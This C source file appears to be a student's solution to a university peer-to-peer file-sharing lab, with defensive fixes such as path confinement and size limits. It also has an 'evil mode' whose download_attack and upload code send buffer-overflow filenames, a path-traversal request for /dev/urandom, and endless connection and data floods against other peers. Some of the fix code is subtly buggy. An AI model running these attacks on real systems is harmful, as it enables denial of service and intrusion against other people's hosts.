// -*- mode: c++ -*-
#define _BSD_EXTENSION
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdarg.h>
#include <ctype.h>
#include <sys/socket.h>
#include <dirent.h>
#include <netdb.h>
#include <assert.h>
#include <pwd.h>
#include <time.h>
#include <limits.h>
#include "md5.h"
#include "osp2p.h"

int evil_mode;			// nonzero iff this peer should behave badly

static struct in_addr listen_addr;	// Define listening endpoint
static int listen_port;

//Code for Lab 4
#define MAXFILESIZ 104857600 //Defined as 100 MiB

// Evil attack limit before forfeiting 
#define MAX_NUM_ATTACK_ATTEMPTS	1000

/*****************************************************************************
 * TASK STRUCTURE
 * Holds all information relevant for a peer or tracker connection, including
 * a bounded buffer that simplifies reading from and writing to peers.
 */

//#define TASKBUFSIZ	4096	// Size of task_t::buf
#define TASKBUFSIZ	65536	// Size of task_t::buf (Increased to 2^16)
#define FILENAMESIZ	256	// Size of task_t::filename

typedef enum tasktype {		// Which type of connection is this?
	TASK_TRACKER,		// => Tracker connection
	TASK_PEER_LISTEN,	// => Listens for upload requests
	TASK_UPLOAD,		// => Upload request (from peer to us)
	TASK_DOWNLOAD		// => Download request (from us to peer)
} tasktype_t;

typedef struct peer {		// A peer connection (TASK_DOWNLOAD)
	char alias[TASKBUFSIZ];	// => Peer's alias
	struct in_addr addr;	// => Peer's IP address
	int port;		// => Peer's port number
	struct peer *next;
} peer_t;

typedef struct task {
	tasktype_t type;	// Type of connection

	int peer_fd;		// File descriptor to peer/tracker, or -1
	int disk_fd;		// File descriptor to local file, or -1

	char buf[TASKBUFSIZ];	// Bounded buffer abstraction
	unsigned head;
	unsigned tail;
	size_t total_written;	// Total number of bytes written
				// by write_to_taskbuf

	char filename[FILENAMESIZ];	// Requested filename
	char disk_filename[FILENAMESIZ]; // Local filename (TASK_DOWNLOAD)

	peer_t *peer_list;	// List of peers that have 'filename'
				// (TASK_DOWNLOAD).  The task_download
				// function initializes this list;
				// task_pop_peer() removes peers from it, one
				// at a time, if a peer misbehaves.
	char digest[128];
} task_t;


// task_new(type)
//	Create and return a new task of type 'type'.
//	If memory runs out, returns NULL.
static task_t *task_new(tasktype_t type)
{
	task_t *t = (task_t *) malloc(sizeof(task_t));
	if (!t) {
		errno = ENOMEM;
		return NULL;
	}

	t->type = type;
	t->peer_fd = t->disk_fd = -1;
	t->head = t->tail = 0;
	t->total_written = 0;
	t->peer_list = NULL;

	// Zero out filenames as opposed to making them the empty string
	memset(t->filename, 0, FILENAMESIZ);
	memset(t->disk_filename, 0, FILENAMESIZ);
	
	
	return t;
}

// task_pop_peer(t)
//	Clears the 't' task's file descriptors and bounded buffer.
//	Also removes and frees the front peer description for the task.
//	The next call will refer to the next peer in line, if there is one.
static void task_pop_peer(task_t *t)
{
	if (t) {
		// Close the file descriptors and bounded buffer
		if (t->peer_fd >= 0)
			close(t->peer_fd);
		if (t->disk_fd >= 0)
			close(t->disk_fd);
		t->peer_fd = t->disk_fd = -1;
		t->head = t->tail = 0;
		t->total_written = 0;
		t->disk_filename[0] = '\0';

		// Move to the next peer
		if (t->peer_list) {
			peer_t *n = t->peer_list->next;
			free(t->peer_list);
			t->peer_list = n;
		}
	}
}

// task_free(t)
//	Frees all memory and closes all file descriptors relative to 't'.
static void task_free(task_t *t)
{
	if (t) {
		do {
			task_pop_peer(t);
		} while (t->peer_list);
		free(t);
	}
}

/********************************************
* MD5 Checksum Creator
********************************************/
/*#define BUFFSIZE 4096
int md5_create(char *filename, char *digest)
{
	char buf[BUFFSIZE + 1];
	md5_state_t *s;
	md5_init(s);
	int read_size, f;

	if ((f = open(filename, O_RDONLY))) {
		while (1) {
			read_size = (int) read(f, buf, BUFFSIZE);
			buf[BUFFSIZE] = '\0';
			
			if (read_size == 0) { 
				message("REACHED END OF CHECKSUM\n");
				read_size = md5_finish_text(s, digest, 1);
				digest[read_size] = '\0';
				close(f);
				return read_size;
			}
			md5_append(&s, (md5_byte_t*) buf, read_size);
		}
	}
	else
		return 0;
}*/

int md5_create(char *filename, char *digest)
{
	FILE *file;
	file = fopen(filename, "r");
	fseek(file, 0, SEEK_END);
	unsigned long num_bytes = ftell(file);
	fseek(file, 0, SEEK_SET);
	unsigned char *file_bytes = malloc(sizeof(char) * num_bytes);
	fread(file_bytes, 1, num_bytes, file);
	//Start the md5
	md5_state_t *pms = malloc(sizeof(md5_state_t));
	md5_init(pms);
	md5_append(pms, file_bytes, num_bytes);
	//Append null terminator to end of result and also fill in result with md5
	int retval = md5_finish_text(pms, digest, 1);
	digest[retval] = '\0';
	free(pms);
	free(file_bytes);
	fclose(file);
	return retval;
}


/******************************************************************************
 * TASK BUFFER
 * A bounded buffer for storing network data on its way into or out of
 * the application layer.
 */

typedef enum taskbufresult {		// Status of a read or write attempt.
	TBUF_ERROR = -1,		// => Error; close the connection.
	TBUF_END = 0,			// => End of file, or buffer is full.
	TBUF_OK = 1,			// => Successfully read data.
	TBUF_AGAIN = 2			// => Did not read data this time.  The
					//    caller should wait.
} taskbufresult_t;

// read_to_taskbuf(fd, t)
//	Reads data from 'fd' into 't->buf', t's bounded buffer, either until
//	't's bounded buffer fills up, or no more data from 't' is available,
//	whichever comes first.  Return values are TBUF_ constants, above;
//	generally a return value of TBUF_AGAIN means 'try again later'.
//	The task buffer is capped at TASKBUFSIZ.
taskbufresult_t read_to_taskbuf(int fd, task_t *t)
{
	unsigned headpos = (t->head % TASKBUFSIZ);
	unsigned tailpos = (t->tail % TASKBUFSIZ);
	ssize_t amt;

	if (t->head == t->tail || headpos < tailpos)
		amt = read(fd, &t->buf[tailpos], TASKBUFSIZ - tailpos);
	else
		amt = read(fd, &t->buf[tailpos], headpos - tailpos);

	if (amt == -1 && (errno == EINTR || errno == EAGAIN
			  || errno == EWOULDBLOCK))
		return TBUF_AGAIN;
	else if (amt == -1)
		return TBUF_ERROR;
	else if (amt == 0)
		return TBUF_END;
	else {
		t->tail += amt;
		return TBUF_OK;
	}
}


// write_from_taskbuf(fd, t)
//	Writes data from 't' into 't->fd' into 't->buf', using similar
//	techniques and identical return values as read_to_taskbuf.
taskbufresult_t write_from_taskbuf(int fd, task_t *t)
{
	unsigned headpos = (t->head % TASKBUFSIZ);
	unsigned tailpos = (t->tail % TASKBUFSIZ);
	ssize_t amt;

	if (t->head == t->tail)
		return TBUF_END;
	else if (headpos < tailpos)
		amt = write(fd, &t->buf[headpos], tailpos - headpos);
	else
		amt = write(fd, &t->buf[headpos], TASKBUFSIZ - headpos);

	if (amt == -1 && (errno == EINTR || errno == EAGAIN
			  || errno == EWOULDBLOCK))
		return TBUF_AGAIN;
	else if (amt == -1)
		return TBUF_ERROR;
	else if (amt == 0)
		return TBUF_END;
	else {
		t->head += amt;
		t->total_written += amt;
		return TBUF_OK;
	}
}


/******************************************************************************
 * NETWORKING FUNCTIONS
 */

// open_socket(addr, port)
//	All the code to open a network connection to address 'addr'
//	and port 'port' (or a listening socket on port 'port').
int open_socket(struct in_addr addr, int port)
{
	struct sockaddr_in saddr;
	socklen_t saddrlen;
	int fd, ret, yes = 1;

	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1
	    || fcntl(fd, F_SETFD, FD_CLOEXEC) == -1
	    || setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
		goto error;

	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_addr = addr;
	saddr.sin_port = htons(port);

	if (addr.s_addr == INADDR_ANY) {
		if (bind(fd, (struct sockaddr *) &saddr, sizeof(saddr)) == -1
		    || listen(fd, 4) == -1)
			goto error;
	} else {
		if (connect(fd, (struct sockaddr *) &saddr, sizeof(saddr)) == -1)
			goto error;
	}

	return fd;

    error:
	if (fd >= 0)
		close(fd);
	return -1;
}


/******************************************************************************
 * THE OSP2P PROTOCOL
 * These functions manage connections to the tracker and connections to other
 * peers.  They generally use and return 'task_t' objects, which are defined
 * at the top of this file.
 */

// read_tracker_response(t)
//	Reads an RPC response from the tracker using read_to_taskbuf().
//	An example RPC response is the following:
//
//      FILE README                             \ DATA PORTION
//      FILE osptracker.cc                      | Zero or more lines.
//      ...                                     |
//      FILE writescan.o                        /
//      200-This is a context line.             \ MESSAGE PORTION
//      200-This is another context line.       | Zero or more CONTEXT lines,
//      ...                                     | which start with "###-", and
//      200 Number of registered files: 12      / then a TERMINATOR line, which
//                                                starts with "### ".
//                                                The "###" is an error code:
//                                                200-299 indicate success,
//                                                other codes indicate error.
//
//	This function empties the task buffer, then reads into it until it
//	finds a terminator line.  It returns the number of characters in the
//	data portion.  It also terminates this client if the tracker's response
//	is formatted badly.  (This code trusts the tracker.)
static size_t read_tracker_response(task_t *t)
{
	char *s;
	size_t split_pos = (size_t) -1, pos = 0;
	t->head = t->tail = 0;

	while (1) {
		// Check for whether buffer is complete.
		for (; pos+3 < t->tail; pos++)
			if ((pos == 0 || t->buf[pos-1] == '\n')
			    && isdigit((unsigned char) t->buf[pos])
			    && isdigit((unsigned char) t->buf[pos+1])
			    && isdigit((unsigned char) t->buf[pos+2])) {
				if (split_pos == (size_t) -1)
					split_pos = pos;
				if (pos + 4 >= t->tail)
					break;
				if (isspace((unsigned char) t->buf[pos + 3])
				    && t->buf[t->tail - 1] == '\n') {
					t->buf[t->tail] = '\0';
					return split_pos;
				}
			}

		// If not, read more data.  Note that the read will not block
		// unless NO data is available.
		int ret = read_to_taskbuf(t->peer_fd, t);
		if (ret == TBUF_ERROR)
			die("tracker read error");
		else if (ret == TBUF_END)
			die("tracker connection closed prematurely!\n");
	}
}


// start_tracker(addr, port)
//	Opens a connection to the tracker at address 'addr' and port 'port'.
//	Quits if there's no tracker at that address and/or port.
//	Returns the task representing the tracker.
task_t *start_tracker(struct in_addr addr, int port)
{
	struct sockaddr_in saddr;
	socklen_t saddrlen;
	task_t *tracker_task = task_new(TASK_TRACKER);
	size_t messagepos;

	if ((tracker_task->peer_fd = open_socket(addr, port)) == -1)
		die("cannot connect to tracker");

	// Determine our local address as seen by the tracker.
	saddrlen = sizeof(saddr);
	if (getsockname(tracker_task->peer_fd,
			(struct sockaddr *) &saddr, &saddrlen) < 0)
		error("getsockname: %s\n", strerror(errno));
	else {
		assert(saddr.sin_family == AF_INET);
		listen_addr = saddr.sin_addr;
	}

	// Collect the tracker's greeting.
	messagepos = read_tracker_response(tracker_task);
	message("* Tracker's greeting:\n%s", &tracker_task->buf[messagepos]);

	return tracker_task;
}


// start_listen()
//	Opens a socket to listen for connections from other peers who want to
//	upload from us.  Returns the listening task.
task_t *start_listen(void)
{
	struct in_addr addr;
	task_t *t;
	int fd;
	addr.s_addr = INADDR_ANY;

	// Set up the socket to accept any connection.  The port here is
	// ephemeral (we can use any port number), so start at port
	// 11112 and increment until we can successfully open a port.
	for (listen_port = 11112; listen_port < 13000; listen_port++)
		if ((fd = open_socket(addr, listen_port)) != -1)
			goto bound;
		else if (errno != EADDRINUSE)
			die("cannot make listen socket");

	// If we get here, we tried about 200 ports without finding an
	// available port.  Give up.
	die("Tried ~200 ports without finding an open port, giving up.\n");

    bound:
	message("* Listening on port %d\n", listen_port);

	t = task_new(TASK_PEER_LISTEN);
	t->peer_fd = fd;
	return t;
}


// register_files(tracker_task, myalias)
//	Registers this peer with the tracker, using 'myalias' as this peer's
//	alias.  Also register all files in the current directory, allowing
//	other peers to upload those files from us.
static void register_files(task_t *tracker_task, const char *myalias)
{
	DIR *dir;
	struct dirent *ent;
	struct stat s;
	char buf[PATH_MAX];
	size_t messagepos;
	assert(tracker_task->type == TASK_TRACKER);

	// Register address with the tracker.
	osp2p_writef(tracker_task->peer_fd, "ADDR %s %I:%d\n",
		     myalias, listen_addr, listen_port);
	messagepos = read_tracker_response(tracker_task);
	message("* Tracker's response to our IP address registration:\n%s",
		&tracker_task->buf[messagepos]);
	if (tracker_task->buf[messagepos] != '2') {
		message("* The tracker reported an error, so I will not register files with it.\n");
		return;
	}

	// Register files with the tracker.
	message("* Registering our files with tracker\n");
	if ((dir = opendir(".")) == NULL)
		die("open directory: %s", strerror(errno));
	while ((ent = readdir(dir)) != NULL) {
		int namelen = strlen(ent->d_name);

		// don't depend on unreliable parts of the dirent structure
		// and only report regular files.  Do not change these lines.
		if (stat(ent->d_name, &s) < 0 || !S_ISREG(s.st_mode)
		    || (namelen > 2 && ent->d_name[namelen - 2] == '.'
			&& (ent->d_name[namelen - 1] == 'c'
			    || ent->d_name[namelen - 1] == 'h'))
		    || (namelen > 1 && ent->d_name[namelen - 1] == '~'))
			continue;

		//File is registered with a checksum
		//char *checksum = malloc(sizeof(char)*128);
		//md5_create(ent->d_name, checksum);

		//osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n", ent->d_name, checksum);
		osp2p_writef(tracker_task->peer_fd, "HAVE %s\n", ent->d_name);
		messagepos = read_tracker_response(tracker_task);
		if (tracker_task->buf[messagepos] != '2')
			error("* Tracker error message while registering '%s':\n%s",
			      ent->d_name, &tracker_task->buf[messagepos]);
	}

	closedir(dir);
}


// parse_peer(s, len)
//	Parse a peer specification from the first 'len' characters of 's'.
//	A peer specification looks like "PEER [alias] [addr]:[port]".
static peer_t *parse_peer(const char *s, size_t len)
{
	peer_t *p = (peer_t *) malloc(sizeof(peer_t));
	if (p) {
		p->next = NULL;
		if (osp2p_snscanf(s, len, "PEER %s %I:%d",
				  p->alias, &p->addr, &p->port) >= 0
		    && p->port > 0 && p->port <= 65535)
			return p;
	}
	free(p);
	return NULL;
}


// start_download(tracker_task, filename)
//	Return a TASK_DOWNLOAD task for downloading 'filename' from peers.
//	Contacts the tracker for a list of peers that have 'filename',
//	and returns a task containing that peer list.
task_t *start_download(task_t *tracker_task, const char *filename)
{
	char *s1, *s2;
	task_t *t = NULL;
	peer_t *p;
	size_t messagepos;
	assert(tracker_task->type == TASK_TRACKER);

	//Check the MD5 if we're actually downloading something
	if (!evil_mode){
		message("* Examining checksum for '%s'\n", filename);
		osp2p_writef(tracker_task->peer_fd, "MD5SUM %s\n", filename);
		messagepos = read_tracker_response(tracker_task);

		s1 = tracker_task->buf;
		s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1);
		
		if(tracker_task->buf[messagepos] == '2') {
			osp2p_snscanf(s1, (s2 - s1), "%s\n", tracker_task->digest);
			tracker_task->digest[128 - 1] = '\0';
			if (strlen(tracker_task->digest) < 5) {
				strcpy(tracker_task->digest, "");
				message("* Rejected checksum for '%s'. Checksum too short.\n", filename);
			} else {
				message("* Got checksum '%s' for file '%s'\n", tracker_task->digest, filename);
			}
		} else {
			message("Receiving the checksum failed!!!!!");
		}
	}
	
	message("* Finding peers for '%s'\n", filename);
	
	//if (evil_mode)
	//		osp2p_writef(tracker_task->peer_fd, "WHO\n");
	//else
	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
	
	messagepos = read_tracker_response(tracker_task);
	if (tracker_task->buf[messagepos] != '2') {
		error("* Tracker error message while requesting '%s':\n%s",
		      filename, &tracker_task->buf[messagepos]);
		goto exit;
	}

	if (!(t = task_new(TASK_DOWNLOAD))) {
		error("* Error while allocating task");
		goto exit;
	}

	//Exercise 2A - Fix buffer overrun
	// check for the filename size
	if (FILENAMESIZ <  strlen(t->filename)) 
	{
		error("* Error: filename is too large.\n");
		goto exit;
	}
	strncpy(t->filename, filename, FILENAMESIZ);
	t->filename[FILENAMESIZ - 1] = '\0';	
	//End 2A Code

	// add peers
	s1 = tracker_task->buf;
	while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
		if (!(p = parse_peer(s1, s2 - s1)))
			die("osptracker responded to WANT command with unexpected format!\n");
		p->next = t->peer_list;
		t->peer_list = p;
		s1 = s2 + 1;
	}
	if (s1 != tracker_task->buf + messagepos)
		die("osptracker's response to WANT has unexpected format!\n");

	

 exit:
	return t;
}


// task_download(t, tracker_task)
//	Downloads the file specified by the input task 't' into the current
//	directory.  't' was created by start_download().
//	Starts with the first peer on 't's peer list, then tries all peers
//	until a download is successful.
static void task_download(task_t *t, task_t *tracker_task)
{
	int i, ret = -1;
	assert((!t || t->type == TASK_DOWNLOAD)
	       && tracker_task->type == TASK_TRACKER);
	
	// Quit if no peers, and skip this peer
	if (!t || !t->peer_list) {
		error("* No peers are willing to serve '%s'\n",
		      (t ? t->filename : "that file"));
		task_free(t);
		return;
	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
		   && t->peer_list->port == listen_port)
		goto try_again;
	
	// Connect to the peer and write the GET command
	message("* Connecting to %s:%d to download '%s'\n",
		inet_ntoa(t->peer_list->addr), t->peer_list->port,
		t->filename);
	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
	if (t->peer_fd == -1) {
		error("* Cannot connect to peer: %s\n", strerror(errno));
		goto try_again;
	}
	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);

	// Open disk file for the result.
	// If the filename already exists, save the file in a name like
	// "foo.txt~1~".  However, if there are 50 local files, don't download
	// at all.
	for (i = 0; i < 50; i++) {
		if (i == 0)
			strcpy(t->disk_filename, t->filename);
		else
			sprintf(t->disk_filename, "%s~%d~", t->filename, i);
		t->disk_fd = open(t->disk_filename,
				  O_WRONLY | O_CREAT | O_EXCL, 0666);
		if (t->disk_fd == -1 && errno != EEXIST) {
			error("* Cannot open local file");
			goto try_again;
		} else if (t->disk_fd != -1) {
			message("* Saving result to '%s'\n", t->disk_filename);
			break;
		}
	}
	if (t->disk_fd == -1) {
		error("* Too many local files like '%s' exist already.\n\
* Try 'rm %s.~*~' to remove them.\n", t->filename, t->filename);
		task_free(t);
		return;
	}

	// Read the file into the task buffer from the peer,
	// and write it from the task buffer onto disk.
	while (1) {
		int ret = read_to_taskbuf(t->peer_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Peer read error");
			goto try_again;
		} else if (ret == TBUF_END && t->head == t->tail)
			/* End of file */
			break;
		ret = write_from_taskbuf(t->disk_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Disk write error");
			goto try_again;
		}
		//Exercise 2B - Check to make sure our max file size isn't passed
		if (t->total_written > MAXFILESIZ){
			error("ERROR: File has exceeded max size allowed. Retrying with new peer.");
			goto try_again;
		}
		//End 2B Code
	}

	// Empty files are usually a symptom of some error.
	if (t->total_written > 0) {
		message("* Downloaded '%s' was %lu bytes long\n",
			t->disk_filename, (unsigned long) t->total_written);

		//Check the MD5 checksum to make sure file matches
		if (strlen(tracker_task->digest) > 0) {
			char check_digest[128];
			if (md5_create(t->filename, check_digest) == 0) {
				message("* Unable to create MD5 check for '%s'. \n", t->filename);
				unlink(t->disk_filename);
				task_free(t);
				return;
			}
			if (strcmp(check_digest, tracker_task->digest) == 0) {
				message("* MD5 checksum matches for '%s'!\n", t->disk_filename);
			} else {
				message("* MD5 checksum does not match for '%s'. Saved '%s' does not match stated '%s'.\n"
					, t->filename, check_digest, tracker_task->digest);
				unlink(t->disk_filename);
				task_free(t);
				return;
			}
		}

		// Inform the tracker that we now have the file,
		// and can serve it to others!  (But ignore tracker errors.)
		if (strcmp(t->filename, t->disk_filename) == 0) {
			osp2p_writef(tracker_task->peer_fd, "HAVE %s\n",
				     t->filename);
			(void) read_tracker_response(tracker_task);
		}
		task_free(t);
		return;
	}
	error("* Download was empty, trying next peer\n");

    try_again:
	if (t->disk_filename[0])
		unlink(t->disk_filename);
	// recursive call
	task_pop_peer(t);
	task_download(t, tracker_task);
}


// task_listen(listen_task)
//	Accepts a connection from some other peer.
//	Returns a TASK_UPLOAD task for the new connection.
static task_t *task_listen(task_t *listen_task)
{
	struct sockaddr_in peer_addr;
	socklen_t peer_addrlen = sizeof(peer_addr);
	int fd;
	task_t *t;
	assert(listen_task->type == TASK_PEER_LISTEN);
	char* file[8];

	fd = accept(listen_task->peer_fd,
		    (struct sockaddr *) &peer_addr, &peer_addrlen);
	if (fd == -1 && (errno == EINTR || errno == EAGAIN
			 || errno == EWOULDBLOCK))
		return NULL;
	else if (fd == -1)
		die("accept");

	message("* Got connection from %s:%d\n",
		inet_ntoa(peer_addr.sin_addr), ntohs(peer_addr.sin_port));

	t = task_new(TASK_UPLOAD);
	t->peer_fd = fd;
	return t;
}


// task_upload(t)
//	Handles an upload request from another peer.
//	First reads the request into the task buffer, then serves the peer
//	the requested file.
static void task_upload(task_t *t)
{
	assert(t->type == TASK_UPLOAD);
	// First, read the request from the peer.
	while (1) {
		int ret = read_to_taskbuf(t->peer_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Cannot read from connection");
			goto exit;
		} else if (ret == TBUF_END
			   || (t->tail && t->buf[t->tail-1] == '\n'))
			break;
	}

	assert(t->head == 0);
	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
		error("* Odd request %.*s\n", t->tail, t->buf);
		goto exit;
	}
	t->head = t->tail = 0;

	//Exercise 2B - Check filename size
	if (strlen(t->buf) > FILENAMESIZ){
		error("ERROR: Filename is too large.");
		goto exit;
	}

	//Exercise 2B - Check that we are working only within current directory
	char path[PATH_MAX];
	char work_dir[PATH_MAX];
	if (!getcwd(work_dir, PATH_MAX)){
		error("ERROR: Invalid working directory.");
		goto exit;
	}
	if (!realpath(t->filename, path)){
		error("ERROR: Invalid file path.");
		goto exit;
	}
	if (strncmp(work_dir, path, strlen(work_dir))){
		error("ERROR: %s not located within working directory.", t->filename);
		goto exit;
	}
	//End 2B Code
	
	t->disk_fd = open(t->filename, O_RDONLY);
	if (t->disk_fd == -1) {
		error("* Cannot open file %s", t->filename);
		goto exit;
	}

	message("* Transferring file %s\n", t->filename);

	int ret = 0;
	
	// Exercise 3 - Overrun disk
	if (evil_mode)
	{
		message("* Attack with a disk overrun.\n");
		while (1) {
			ret = osp2p_writef(t->peer_fd, "Cat1,Cat2,Cat3,Cat4.");
			if (ret == TBUF_ERROR){
				message("* The disk overrun attack was successful, we have a peer write error.");
				goto exit;
			}
		}
	//End 3 Code	
	} else {
		// Now, read file from disk and write it to the requesting peer.
		while (1) {
			//int ret = write_from_taskbuf(t->peer_fd, t);
			ret = write_from_taskbuf(t->peer_fd, t);
			if (ret == TBUF_ERROR) {
				//if (evil_mode == 3)
				//	message("* The disk overrun attack was successful, we have a peer write error.");
				//else
					error("* Peer write error");
				goto exit;
			}

			ret = read_to_taskbuf(t->disk_fd, t);
			if (ret == TBUF_ERROR) {
				error("* Disk read error");
				goto exit;
			} else if (ret == TBUF_END && t->head == t->tail) {
				/* End of file */
				//if (evil_mode == 3)
				//	lseek(t->disk_fd, 0, 0); // continue writing by reset file pointer to beginning of file
				//else
					break;
			}
		}
	}

	message("* Upload of %s complete\n", t->filename);

    exit:
	task_free(t);
}

// this is where the evil happens
void download_attack(task_t *t, task_t *tracker_task)
{
	assert((!t || t->type == TASK_DOWNLOAD) && tracker_task->type == TASK_TRACKER);

	if (!t || !t->peer_list){
		error("* Error: Can't proceed with download attack.");
		task_free(t);
		return;
	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr && t->peer_list->port == listen_port)
		goto try_again;

	osp2p_writef(tracker_task->peer_fd, "WHO\n");

	message("* Attacking %s:%d with '%s'\n", 
		inet_ntoa(t->peer_list->addr), t->peer_list->port, t->filename);
	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
	if (t->peer_fd == -1) {
		error("* Error: can't connect to peer: %s\n", strerror(errno));
		goto try_again;
	}
	
	// First attempt a buffer overflow on the filename
	message("* Try attacking with filename buffer overflow\n");
	// create buffer overflow input
	char overflow[FILENAMESIZ * 3];
	memset(overflow, 1, FILENAMESIZ*3);
	// send input
	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);	

	//Next try a peer overrun attack
	message("* Next trying peer denial of service\n");
	// try once
	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
	if (t->peer_fd == -1) {
		error("* Error: can't connect to peer: %s\n", strerror(errno));
		goto try_again;
	}
	osp2p_writef(t->peer_fd, "GET ../../.../../dev/urandom OSP2P\n");	

	// attack repeatedly
	while (1) {
		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
		if (t->peer_fd == -1) {
			error("* Successful peer overrun - user can no longer connect to peer any more: %s\n"
				, strerror(errno));
		}
		osp2p_writef(t->peer_fd, "GET cat1.jpg OSP2P\n");
	}

	while (1){
		int ret = read_to_taskbuf(t->peer_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Disk read error");
			goto try_again;
		} else if (ret == TBUF_END && t->head == t->tail)
				break;
	}

	try_again: 
		close(t->peer_fd);
		//All attacks on the peer done
		message("* Tried attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
		task_pop_peer(t);
		download_attack(t,tracker_task);
}


// main(argc, argv)
//	The main loop!
int main(int argc, char *argv[])
{
	task_t *tracker_task, *listen_task, *t, *prev_task;
	struct in_addr tracker_addr;
	int tracker_port;
	char *s;
	const char *myalias;
	struct passwd *pwent;
	int i;
	char file[8];
	pid_t pid;

	// Default tracker is read.cs.ucla.edu
	//osp2p_sscanf("131.179.80.139:11111", "%I:%d",
	osp2p_sscanf("164.67.100.231:12997", "%I:%d",
		     &tracker_addr, &tracker_port);
	if ((pwent = getpwuid(getuid()))) {
		myalias = (const char *) malloc(strlen(pwent->pw_name) + 20);
		sprintf((char *) myalias, "%s%d", pwent->pw_name,
			(int) time(NULL));
	} else {
		myalias = (const char *) malloc(40);
		sprintf((char *) myalias, "osppeer%d", (int) getpid());
	}

	// Ignore broken-pipe signals: if a connection dies, server should not
	signal(SIGPIPE, SIG_IGN);

	// Process arguments
    argprocess:
	if (argc >= 3 && strcmp(argv[1], "-t") == 0
	    && (osp2p_sscanf(argv[2], "%I:%d", &tracker_addr, &tracker_port) >= 0
		|| osp2p_sscanf(argv[2], "%d", &tracker_port) >= 0
		|| osp2p_sscanf(argv[2], "%I", &tracker_addr) >= 0)
	    && tracker_port > 0 && tracker_port <= 65535) {
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 't'
		   && (osp2p_sscanf(argv[1], "-t%I:%d", &tracker_addr, &tracker_port) >= 0
		       || osp2p_sscanf(argv[1], "-t%d", &tracker_port) >= 0
		       || osp2p_sscanf(argv[1], "-t%I", &tracker_addr) >= 0)
		   && tracker_port > 0 && tracker_port <= 65535) {
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 3 && strcmp(argv[1], "-d") == 0) {
		if (chdir(argv[2]) == -1)
			die("chdir");
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'd') {
		if (chdir(argv[1]+2) == -1)
			die("chdir");
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 3 && strcmp(argv[1], "-b") == 0
		   && osp2p_sscanf(argv[2], "%d", &evil_mode) >= 0) {
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'b'
		   && osp2p_sscanf(argv[1], "-b%d", &evil_mode) >= 0) {
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 2 && strcmp(argv[1], "-b") == 0) {
		evil_mode = 1;
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 2 && (strcmp(argv[1], "--help") == 0
				 || strcmp(argv[1], "-h") == 0)) {
		printf("Usage: osppeer [-tADDR:PORT | -tPORT] [-dDIR] [-b]\n"
"Options: -tADDR:PORT  Set tracker address and/or port.\n"
"         -dDIR        Upload and download files from directory DIR.\n"
"         -b[MODE]     Evil mode!!!!!!!!\n");
		exit(0);
	}

	// Connect to the tracker and register our files.
	tracker_task = start_tracker(tracker_addr, tracker_port);
	listen_task = start_listen();
	register_files(tracker_task, myalias);
	prev_task = NULL;
	
	// First, download files named on command line.
	//Exercise 1 - Parallel Downloads
	for (; argc > 1; argc--, argv++){
		if ((t = start_download(tracker_task, argv[1]))){
			pid_t child;
			child = fork();
			if (child == 0){ //Child Process
				task_download(t, tracker_task);
				exit(0);
			} else if (child < 0){//ERROR
				error("Fork error. Could not download file.\n");
			} else
				task_free(t);
		}
	}
	//End 1 Code

	if (evil_mode){
		argv--;
		strcpy(argv[1],"cat1.jpg");
		if ((t = start_download(tracker_task, argv[1]))){
			pid_t child;
			child = fork();
			if (child == 0){ //Child Process
				download_attack(t, tracker_task);
				exit(0);
			} else if (child < 0){//ERROR
				error("Fork error. Could not download file.\n");
			}
		}
		
	}

	// Then accept connections from other peers and upload files to them!
	//Exercise 1 - Parallel Uploads
	while ((t = task_listen(listen_task))) {
		// don't allow immediately repeated requests from the same peer
		if (prev_task && prev_task->peer_fd == t->peer_fd) {
			error("* Error: repeat requests from same peer.\n");
			prev_task = NULL;
			continue;
		}
		pid_t child;
		child = fork();
		if (child == 0){ //Child Process
			task_upload(t);
			exit(0);
		} else if (child < 0){//ERROR
			error("Fork error. Could not upload file.\n");
		}
		else
			prev_task = t;
	}
	//End 1 Code

	return 0;
}
